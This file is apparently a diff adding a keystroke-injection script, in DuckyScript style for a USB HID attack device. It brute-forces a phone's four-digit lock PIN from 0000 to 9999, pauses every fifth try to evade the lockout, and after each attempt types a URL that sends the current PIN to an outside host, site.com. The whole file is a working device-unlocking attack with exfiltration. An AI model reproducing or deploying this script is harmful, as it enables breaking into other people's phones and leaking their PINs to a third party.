@@ -1,0 +1,47 @@
+REM search http://site.com?*PIN*
+FUNCTION MAKEREQUEST()
+    DELAY 1000
+    REM open search bar
+    GUI r
+    DELAY 3000
+    STRING URL
+    DELAY 300
+    STRING $N
+    ENTER
+    DELAY 2000
+END_FUNCTION
+
+REM this function must be modified based on the phone
+FUNCTION WAIT()
+    $Cont = 0
+    REM wait 30 s every 5 attempts
+    IF ($N % 5 == 0) THEN
+        DELAY 30000
+    END_IF
+    APP
+    DELAY 500
+    APP
+    DELAY 500
+END_FUNCTION
+
+REM APP wakes the phone (in my case)
+APP
+DELAY 1000
+$N = 0
+DEFINE URL http://site.com?
+$WaitTimes = 1
+WHILE ($N < 10000)
+    WAIT()
+    IF ($N < 10) THEN
+        STRING 000
+    ELSE IF ($N < 100) THEN
+        STRING 00
+    ELSE IF ($N < 1000) THEN
+        STRING 0
+    END_IF
+    STRING $N
+    DELAY 500
+    MAKEREQUEST()
+    $N = ($N + 1)
+END_WHILE  
+
